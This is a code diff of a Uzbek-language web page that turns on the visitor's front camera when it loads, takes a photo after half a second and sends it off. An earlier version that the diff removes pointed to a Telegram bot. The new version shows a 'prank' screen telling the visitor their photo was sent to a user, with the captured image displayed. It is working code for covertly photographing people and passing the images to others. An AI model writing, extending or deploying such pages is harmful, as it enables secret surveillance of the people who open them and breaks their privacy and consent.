@@ -5,44 +5,107 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rasmga Olish</title>
     <style>
-        * {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f4f4f4;
+        /* Yangi CSS stil */
+        body {
             margin: 0;
             padding: 0;
+            background: #050614;
+            font-family: Arial, sans-serif;
+            color: white;
         }
+
         #container {
-            max-width: 400px;
+            max-width: 700px;
             margin: 50px auto;
             padding: 20px;
-            background: #fff;
-            border-radius: 10px;
+            background: #131426;
+            border-radius: 20px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
         }
+
         video, canvas {
             width: 100%;
             border-radius: 10px;
             margin-bottom: 10px;
+            display: none; /* Video va canvas boshlang'ich holatda yashirin */
         }
-        #message {
+
+        .picture {
+            border-radius: 20px;
+            max-width: 600px;
+            height: 400px;
+            background: #1a1a2e;
+            margin: 0 auto;
+        }
+
+        #byte_photo {
+            border-radius: 10px;
+            background-size: cover;
+            height: 100%;
+            background-position: center;
+        }
+
+        .desc {
+            margin-top: 20px;
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 20px;
+        }
+
+        .desc p {
+            color: white;
+            font-size: 16px;
+        }
+
+        span {
+            color: #2871FF;
+        }
+
+        button {
+            padding: 10px 20px;
+            color: white;
+            background: #2871FF;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background: transparent;
+            border: 1px solid #2871FF;
+        }
+
+        #message, #error {
             font-size: 18px;
-            color: #28a745;
             font-weight: bold;
+            margin-top: 20px;
         }
+
+        #message {
+            color: #28a745;
+        }
+
+        #error {
+            color: red;
+        }
+
         .hidden { display: none; }
-        #loading {
-            font-size: 18px;
-            color: #007bff;
-        }
     </style>
 </head>
 <body>
     <div id="container">
-        <h2>Salom</h2>
-        <p id="loading"></p>
         <video id="video" autoplay playsinline class="hidden"></video>
         <canvas id="canvas" class="hidden"></canvas>
+        <div id="prank" class="hidden">
+            <div class="picture">
+                <div id="byte_photo"></div>
+            </div>
+            <div class="desc">
+                <p>🙊 Sizning rasmingiz <span>@Foydalanuvchi</span> ga yuborildi!</p>
+            </div>
+        </div>
         <p id="message" class="hidden">📤 Rasm yuborilmoqda...</p>
         <p id="error" class="hidden" style="color: red;"></p>
         <button id="retry" class="hidden">🔄 Qayta urinish</button>
@@ -56,6 +119,8 @@
         const errorMessage = document.getElementById("error");
         const retryButton = document.getElementById("retry");
         const loadingMessage = document.getElementById("loading");
+        const prank = document.getElementById("prank");
+        const bytePhoto = document.getElementById("byte_photo");
 
         async function startCamera() {
             try {
@@ -65,7 +130,7 @@
 
                 const constraints = {
                     video: {
-                        facingMode: { ideal: "user" }, // Agar old kamera ishlamasa, orqa kamera avtomatik tanlanadi
+                        facingMode: { ideal: "user" },
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     }
@@ -79,7 +144,6 @@
                     video.classList.remove("hidden");
                     loadingMessage.classList.add("hidden");
 
-                    // **0.5 sekund ichida rasmga olish**
                     setTimeout(captureImage, 500);
                 };
             } catch (err) {
@@ -118,11 +182,9 @@
                 return res.json();
             })
             .then(data => {
-                document.getElementById("container").innerHTML = `
-                    <h2>✅ Rasm muvaffaqiyatli yuborildi!</h2>
-                    <p>Sizning rasmingiz botga yuborildi:</p>
-                    <a href="https://t.me/AsilbekCode_Picture_bot" target="_blank">📤 Rasmni ko‘rish</a>
-                `;
+                prank.classList.remove("hidden");
+                bytePhoto.style.backgroundImage = `url(${imageData})`;
+                message.classList.add("hidden");
             })
             .catch(err => {
                 console.error("Xatolik:", err);
